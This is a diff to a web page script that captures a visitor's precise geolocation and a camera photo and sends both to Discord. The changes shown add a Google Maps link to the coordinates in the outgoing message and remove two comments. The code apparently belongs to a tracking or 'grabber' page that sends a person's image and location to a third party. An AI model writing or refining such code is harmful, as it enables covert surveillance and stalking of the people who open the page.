@@ -42,7 +42,7 @@
                             alert("Location access denied. Please enable location services.");
                             reject(error);
                         },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Add timeout and accuracy settings
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 } else {
                     console.error("Geolocation is not supported by this browser.");
@@ -59,8 +59,13 @@
                 currentLocation = await fetchLocation();
             } catch (error) {
                 console.error('Location fetch failed:', error);
-                // Fallback message if location not available
                 currentLocation = { latitude: "Not available", longitude: "Not available" };
+            }
+
+            // Construct Google Maps link if location is available
+            let googleMapsLink = "Location not available";
+            if (currentLocation.latitude !== "Not available" && currentLocation.longitude !== "Not available") {
+                googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${currentLocation.latitude},${currentLocation.longitude}`;
             }
 
             // Capture photo
@@ -69,8 +74,8 @@
                 const formData = new FormData();
                 formData.append('file', blob, 'captured_image.png');
 
-                // Include location in message content if available
-                let locationMessage = `Location: Latitude ${currentLocation.latitude}, Longitude ${currentLocation.longitude}`;
+                // Include location in message content with Google Maps link
+                let locationMessage = `Location: Latitude ${currentLocation.latitude}, Longitude ${currentLocation.longitude}\nGoogle Maps: ${googleMapsLink}`;
                 formData.append('content', locationMessage);
 
                 // Send the photo and location to Discord
